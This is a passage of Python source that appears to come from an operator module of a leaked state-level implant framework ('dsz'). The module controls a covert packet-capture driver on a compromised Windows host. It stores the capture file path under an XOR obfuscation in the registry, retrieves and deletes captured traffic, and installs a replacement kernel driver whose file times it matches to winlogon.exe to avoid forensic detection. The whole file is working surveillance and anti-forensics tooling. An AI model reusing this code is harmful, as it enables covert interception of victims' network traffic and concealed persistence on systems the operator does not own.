        Echo('* You must load the driver before you can configure it (KiSu requirement)', dsz.ERROR)
        return False
    else:
        if value:
            if len(value) == 1:
                size = int(value[0])
            else:
                Echo('* <size>', dsz.ERROR)
                return False
        else:
            currentValue = 0
            try:
                currentValue = dsz.windows.registry.GetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_MaximumFileSize)[0]
            except:
                currentValue = None

            Echo('')
            Echo('Enter a size of zero for an unlimited capture file')
            Echo('')
            if currentValue != None:
                size = dsz.ui.GetInt('Enter the maximum file size (in bytes)', currentValue)
            else:
                size = dsz.ui.GetInt('Enter the maximum file size (in bytes)', '%u' % 1048576)
        Echo('Setting maximum file size')
        try:
            dsz.windows.registry.SetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_MaximumFileSize, size, 'REG_DWORD')
            Echo('    SUCCESS', dsz.GOOD)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Maximum File Size', 'Successful')
            return True
        except:
            Echo('    FAILED', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Maximum File Size', 'Failed')
            return False

        return


def StartCapturing(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    x = dsz.control.Method()
    dsz.control.echo.Off()
    Echo('Starting packet capture')
    try:
        for reason, function in [
         ('Unable to get DSKY state',
          lambda : not dsz.cmd.Run('trafficcapture -status -name %s' % params[ParamsKey_DriverName], dsz.RUN_FLAG_RECORD)),
         (
          'Cannot query for packet filter', lambda : not GetPacketFilter(params, bQuiet=True)),
         (
          'Zero-length BPF filter', lambda : dsz.cmd.data.Get('Filter::AdapterFilter', dsz.TYPE_INT)[0] == 0)]:
            if function():
                if not bAsk:
                    Echo('    FAILED (%s)' % reason, dsz.ERROR)
                    dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Start Capturing', 'Failed')
                    return False
                Echo('Start packet capture will likely fail:  %s' % reason, dsz.WARNING)
                if dsz.ui.Prompt('Do you wish to override this warning and try anyway?', False):
                    break
                else:
                    return False

    except Exception as e:
        Echo('    FAILED (unable to get DSKY state)', dsz.ERROR)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Start Capturing', 'Failed')
        return False

    if dsz.cmd.Run('trafficcapture -name %s -control start' % params[ParamsKey_DriverName]):
        Echo('    SUCCESS', dsz.GOOD)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Start Capturing', 'Successful')
        return True
    else:
        Echo('    FAILED (command failed)', dsz.ERROR)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Start Capturing', 'Failed')
        return False
        return


def StopCapturing(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    x = dsz.control.Method()
    dsz.control.echo.Off()
    Echo('Stopping packet capture')
    if dsz.cmd.Run('trafficcapture -name %s -control stop' % params[ParamsKey_DriverName]):
        Echo('    SUCCESS', dsz.GOOD)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Stop Capturing', 'Successful')
        return True
    else:
        Echo('    FAILED', dsz.ERROR)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Stop Capturing', 'Failed')
        return False
        return


def SetCaptureFileName(params, value=None, bAskParam=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if not IsDskyRunning(params) and IsKiSuRequested(params):
        Echo('* You must load the driver before you can configure it (KiSu requirement)', dsz.ERROR)
        return False
    else:
        if value:
            if len(value) != 1:
                Echo('* <PathToCaptureFile>')
            if value[0].lower() == 'default':
                fileName = getFileNameFromRegistry(params)
            else:
                fileName = value[0]
            if _storeCaptureFile(params, fileName):
                params[ParamsKey_CaptureFile] = fileName
                return True
            else:
                return False

        else:
            currentValue = getFileNameFromRegistry(params)
            selectedFile = dsz.ui.GetString('Please enter the capture file name', currentValue)
            return SetCaptureFileName(params, [selectedFile])
        return


def SetEncryptionKey(params, value=None, bAskParam=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if not IsDskyRunning(params) and IsKiSuRequested(params):
        Echo('* You must load the driver before you can configure it (KiSu requirement)', dsz.ERROR)
        return False
    else:
        if value != None:
            if len(value) != 1:
                Echo('* <EncryptionKey>')
                return False
            if not _encryptKeyIsValid(value[0]):
                return False
            key = value[0]
            Echo('Setting encryption key (%s)' % key)
            try:
                dsz.windows.registry.SetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_EncryptionKey, key, 'REG_BINARY')
                Echo('    SUCCESS', dsz.GOOD)
                params[ParamsKey_EncryptionKey] = key
                dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Encryption Key', 'Successful')
                return True
            except Exception as e:
                Echo('    FAILED (%s)' % e, dsz.ERROR)
                dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Encryption Key', 'Failed')
                return False

        else:
            currentValue = getEncryptionKeyFromRegistry(params)
            selectedFile = dsz.ui.GetString('Please enter the encryption key', currentValue)
            return SetEncryptionKey(params, [selectedFile])
        return


def GetCaptureFile(params, value=None, bAskParam=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    captureFile = _convertFileNameToWin32(getFileNameFromRegistry(params))
    bAutoDelete = False
    if value:
        if value[0].lower() == 'false':
            bAutoDelete = False
        elif value[0].lower() == 'true':
            bAutoDelete = True
        else:
            Echo('* <bDeleteFile=True|False>')
            return False
    if isCapturing(params):
        bResume = True
        StopCapturing(params)
    else:
        bResume = False
    try:
        Echo('Getting capture file (%s)' % captureFile)
        if not dsz.cmd.Run('get "%s" -name %s_ -filetype %s' % (captureFile, params[ParamsKey_Project], params[ParamsKey_Project].upper()), dsz.RUN_FLAG_RECORD):
            Echo('    FAILED (get failed)', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Capture File', 'Failed')
            return False
        try:
            fileSize = dsz.cmd.data.Get('FileStop::written', dsz.TYPE_INT)[0]
            Echo('    SUCCESS (%d bytes)' % fileSize, dsz.GOOD)
        except Exception as e:
            Echo('    SUCCESS (%s)' % e, dsz.GOOD)

        try:
            getDir = dsz.cmd.data.Get('LocalGetDirectory::Path', dsz.TYPE_STRING)[0]
            localName = dsz.cmd.data.Get('FileLocalName::LocalName', dsz.TYPE_STRING)[0]
            bRet = ParseCaptureFile(params, '%s/%s' % (getDir, localName))
            if bAutoDelete or bAsk and dsz.ui.Prompt('Would you like to delete the existing log file?', bRet):
                DeleteCaptureFile(params, bStop=False)
            return bRet
        except Exception as e:
            Echo('    FAILED (exception: %s)' % e, dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Capture File', 'Failed')
            return False

    finally:
        if bAsk and dsz.ui.Prompt('Would you like to resume capturing?', bResume):
            StartCapturing(params)

    return


def ParseCaptureFile(params, fileName):
    Echo('Parsing capture file into .pcap files')
    try:
        getDir = dsz.cmd.data.Get('LocalGetDirectory::Path', dsz.TYPE_STRING)[0]
        localName = dsz.cmd.data.Get('FileLocalName::LocalName', dsz.TYPE_STRING)[0]
        LogsDir = dsz.lp.GetLogsDirectory()
        ResourceDir = dsz.lp.GetResourcesDirectory()
        toolLoc = '%s/DSky/Tools/i386-winnt/ParseCapture.exe' % ResourceDir
        dirName = 'Capture_%s' % dsz.Timestamp()
        captureDir = '%s/%s' % (LogsDir, dirName)
        try:
            os.mkdir(captureDir)
        except:
            pass

        dsz.script.data.Start('DSkyParse')
        dsz.script.data.Add('InputFile', '%s/%s' % (getDir, localName), dsz.TYPE_STRING)
        dsz.script.data.Add('OutputDirectory', dirName, dsz.TYPE_STRING)
        dsz.script.data.Store()
        try:
            encryptKeyStr = ' \\"%s\\"' % getEncryptionKeyFromRegistry(params)
        except:
            raise
            encryptKeyStr = ''

        if not dsz.cmd.Run('local run -command "%s %s/%s %s%s" -redirect -noinput' % (toolLoc, LogsDir, fileName, captureDir, encryptKeyStr), dsz.RUN_FLAG_RECORD):
            Echo('    FAILED (run failed)', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Capture File', 'Failed')
            return False
        try:
            if dsz.cmd.data.Get('ProcessStatus::Status', dsz.TYPE_INT)[0] == 0:
                Echo('    SUCCCESS', dsz.GOOD)
                dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Capture File', 'Successful')
                return True
            Echo('    FAILED (run failed)', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Capture File', 'Failed')
            return False
        except:
            Echo('    FAILED (could not get return code)', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Capture File', 'Failed')
            return False

    except Exception as e:
        Echo('    FAILED (exception: %s)' % e, dsz.ERROR)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Capture File', 'Failed')
        return False


def DeleteCaptureFile(params, value=None, bAsk=g_bAskQuestions, bStop=True):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    captureFile = _convertFileNameToWin32(getFileNameFromRegistry(params))
    bResume = False
    if bStop and isCapturing(params):
        bResume = True
        StopCapturing(params)
    try:
        Echo('Deleting capture file (%s)' % captureFile)
        if not dsz.cmd.Run('delete -file "%s"' % captureFile, dsz.RUN_FLAG_RECORD):
            Echo('    FAILED (delete failed)', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Delete Capture File', 'Failed')
            return False
        Echo('    SUCCESS', dsz.GOOD)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Delete Capture File', 'Successful')
        return True
    finally:
        if bResume:
            StartCapturing(params)


def isCapturing(params):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Check Driver Status')
    bSuccess = True
    captureFile = ''
    if not dsz.cmd.Run('trafficcapture -status -name %s' % params[ParamsKey_DriverName], dsz.RUN_FLAG_RECORD):
        return False
    try:
        return dsz.cmd.data.Get('Status::FilterActive', dsz.TYPE_BOOL)[0] or dsz.cmd.data.Get('Status::ThreadRunning', dsz.TYPE_BOOL)[0]
    except Exception as e:
        Echo('Error thrown... %s' % e)
        return False


def getEncryptionKeyFromRegistry(params):
    try:
        keyStr = dsz.windows.registry.GetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_EncryptionKey)[0]
        if len(keyStr) != 32:
            raise RuntimeError('Bad key')
        key = ''
        for i in range(0, 16):
            val = int(keyStr[i * 2:(i + 1) * 2], 16)
            if len(key) > 0:
                key = key + ' '
            key = key + '%02x' % val

        params[ParamsKey_EncryptionKey] = key
    except:
        key = params[ParamsKey_EncryptionKey]

    return key


def getFileNameFromRegistry(params):
    try:
        fileNameBytes = dsz.windows.registry.GetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_CaptureFileName)[0]
        fileName = _convertBytesToFileName(fileNameBytes)
        params[ParamsKey_CaptureFile] = fileName
    except:
        try:
            fileName = dsz.windows.registry.GetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_CaptureFileName_Old)[0]
            params[ParamsKey_CaptureFile] = fileName
        except:
            fileName = params[ParamsKey_CaptureFile]

    return fileName


def IsKiSuRequested(params):
    if ParamsKey_Method in params:
        if params[ParamsKey_Method].lower() == 'dsz':
            return False
        if params[ParamsKey_Method].lower() == 'demi':
            return True
    try:
        state = dsz.env.Get(demi.KiSuEnabledEnv)
        return state.lower() in ('true', 'enabled', 'on', '1', 'go', 'use')
    except:
        return False


def IsDskyRunning(params):
    return dsz.cmd.Run('trafficcapture -status -name %s' % params[ParamsKey_DriverName], 0)


def IsKiSuEnabled(params):
    if ParamsKey_Method in params:
        if params[ParamsKey_Method].lower() == 'dsz':
            return False
        if params[ParamsKey_Method].lower() == 'demi':
            if bNoDemi:
                Echo(' DeMi is not installed on this LP', dsz.ERROR)
                sys.exit(-1)
            return True
    if bNoDemi:
        return False
    return demi.UseKiSu()


def DszUpgradeDriver(project, drvName, ask=True):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    systemRoot = dsz.path.windows.GetSystemPath()
    tmpName = '%s32.sys' % drvName
    Echo('Move existing driver')
    if not dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, drvName, systemRoot, tmpName)):
        Echo('    FAILED', dsz.ERROR)
        return False
    Echo('    MOVED', dsz.GOOD)
    Echo('Uploading the SYS file')
    if not dsz.cmd.Run('put "%s.sys" -name "%s\\drivers\\%s.sys" -permanent -project %s' % (drvName, systemRoot, drvName, project)):
        Echo('    FAILED', dsz.ERROR)
        dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, tmpName, systemRoot, drvName))
        return False
    Echo('    SUCCESS', dsz.GOOD)
    if dsz.version.checks.IsOs64Bit():
        matchFile = '%s\\winlogon.exe' % systemRoot
    else:
        matchFile = '%s\\user.exe' % systemRoot
    Echo('Matching file times for %s.sys with %s' % (drvName, matchFile))
    if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s.sys"' % (matchFile, systemRoot, drvName)):
        Echo('    MATCHED', dsz.GOOD)
    else:
        Echo('    FAILED', dsz.WARNING)
    Echo('Matching file times for %s with %s' % (tmpName, matchFile))
    if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s"' % (matchFile, systemRoot, tmpName)):
        Echo('    MATCHED', dsz.GOOD)
    else:
        Echo('    FAILED', dsz.WARNING)
    Echo('Deleting existing driver')
    if dsz.cmd.Run('delete -file "%s\\drivers\\%s" -afterreboot' % (systemRoot, tmpName)):
        Echo('    MOVED', dsz.GOOD)
    else:
        Echo('    FAILED', dsz.ERROR)
    Echo('Upgrade complete (reboot required)')
    return True


def Echo(message, type=dsz.DEFAULT):
    if g_bSilent:
        return
    dsz.ui.Echo(message, type)


def _convertBytesToFileName(fileNameBytes):
    nameChars = list()
    for i in range(len(fileNameBytes) / 4):
        val = int(fileNameBytes[i * 4:(i + 1) * 4], 16)
        val ^= (g_baseMungeValue + (i << 8 | i)) % 65535
        val = val >> 8 & 255 | val << 8 & 65280
        nameChars.append(unichr(val))

    if ord(nameChars[len(nameChars) - 1]) == 0:
        nameChars = nameChars[0:len(nameChars) - 1]
    uName = u''.join(nameChars)
    return uName.encode('utf_8')


def _convertFileNameToBytes(fileName):
    uFilename = fileName.encode('utf_16_le')
    captureBytes = ''
    i = 0
    while i < len(uFilename) / 2:
        c = ord(uFilename[i * 2]) << 8 | ord(uFilename[i * 2 + 1])
        val = c ^ (g_baseMungeValue + (i << 8 | i)) % 65535
        valStr = '%02x %02x' % (val >> 8 & 255, val & 255)
        if len(captureBytes) > 0:
            captureBytes = captureBytes + ' '
        captureBytes = captureBytes + valStr
        i = i + 1

    if len(captureBytes) > 0:
        captureBytes = captureBytes + ' '
    val = 0 ^ (g_baseMungeValue + (i << 8 | i)) % 65535
    captureBytes = captureBytes + '%02x %02x' % (val >> 8 & 255, val & 255)
    return captureBytes


def _convertFileNameToWin32(fileName):
    global g_SystemRoot
    global g_SystemSys
    parts = fileName.split('\\')
    if len(parts) < 3:
        return fileName
    else:
        if len(parts[0]) == 0 and parts[1] == '??':
            fileName = ''
            for part in parts[2:]:
                if len(fileName) > 0:
                    fileName = '%s\\%s' % (fileName, part)
                else:
                    fileName = part

        elif len(parts[0]) == 0 and parts[1] == 'SystemRoot':
            if g_SystemRoot == None or g_SystemSys == None:
                g_SystemRoot, g_SystemSys = dsz.path.windows.GetSystemPaths()
            fileName = g_SystemRoot
            for part in parts[2:]:
                if fileName[-1] != '\\':
                    fileName = '%s\\%s' % (fileName, part)
                else:
                    fileName = part

        return fileName


def _encryptKeyIsValid(key):
    Echo('Verifying encryption key (%s)' % key)
    keyVals = key.split(' ', 15)
    if len(keyVals) != 16:
        Echo('    FAILED', dsz.ERROR)
        return False
    for val in keyVals:
        try:
            v = int(val, 16)
            if v < 0 or v > 256:
                Echo('    FAILED', dsz.ERROR)
                return False
        except:
            Echo('    FAILED', dsz.ERROR)
            return False

    Echo('    SUCCESS', dsz.GOOD)
    return True


def _storeCaptureFile(params, captureFile):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if not IsDskyRunning(params) and IsKiSuRequested(params):
        Echo('* You must load the driver before you can configure it (KiSu requirement)', dsz.ERROR)
        return False
    captureBytes = _convertFileNameToBytes(captureFile)
    Echo('Setting capture file (%s)' % captureFile)
    try:
        dsz.windows.registry.SetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_CaptureFileName, captureBytes, 'REG_BINARY')
        Echo('    SUCCESS', dsz.GOOD)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Capture File', 'Successful')
        return True
    except Exception as e:
        Echo('    FAILED (%s)' % e, dsz.ERROR)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Capture File', 'Failed')
        return False


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)